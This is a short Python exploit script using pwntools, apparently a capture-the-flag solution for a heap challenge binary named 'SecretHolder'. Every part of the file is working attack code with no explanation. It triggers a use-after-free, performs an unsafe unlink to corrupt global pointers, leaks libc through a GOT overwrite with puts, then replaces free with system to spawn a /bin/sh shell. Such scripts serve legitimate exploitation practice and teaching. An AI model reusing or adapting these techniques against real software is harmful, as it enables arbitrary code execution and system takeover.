from pwn import *

# init
r = process('./SecretHolder')
e = ELF('./SecretHolder')
libc = e.libc
context.arch = 'amd64'
buf = 0x6020a0

def create(option, content):
    r.sendlineafter('3. Renew secret\n', '1')
    r.sendlineafter('3. Huge secret\n', str(option))
    r.sendafter('Tell me your secret: \n', content)

def renew(option, content):
    r.sendlineafter('3. Renew secret\n', '3')
    r.sendlineafter('3. Huge secret\n', str(option))
    r.sendafter('Tell me your secret: \n', content)

def wipe(option):
    r.sendlineafter('3. Renew secret\n', '2')
    r.sendlineafter('3. Huge secret\n', str(option))

log.info('buffer addr: %#x' % buf)

# use after free
create(1, 'A'*0x10)
wipe(1)
create(2, 'A'*0x10)
wipe(1)
create(1, 'A'*0x10)

# overflow and unlink
create(3, 'A'*0x10)
wipe(3)
create(3, 'A'*0x10)
renew(2, p64(0)+p64(0x21)+p64(buf-0x18)+p64(buf-0x10)+p64(0x20)+p64(0x61a90))
wipe(3)

# rewrite global pointers
renew(2, '\x00'*0x18+p64(0x6020a0)+p64(e.got['free'])+p64(e.got['puts'])+p32(0x1)*3)

# leak libc
renew(3, p64(e.plt['puts']))
wipe(1)
puts = u64(r.recv(6)+'\x00\x00')
libc_base = puts - libc.symbols['puts']
log.info('libc base: %#x' % libc_base)

# rewrite global pointers
system = libc_base + libc.symbols['system']
sh = libc_base + libc.search('/bin/sh\x00').next()
renew(2, p64(0)+p64(e.got['free'])+p64(sh)+p32(0x1)*3)
renew(3, p64(system))
wipe(1)


r.interactive()
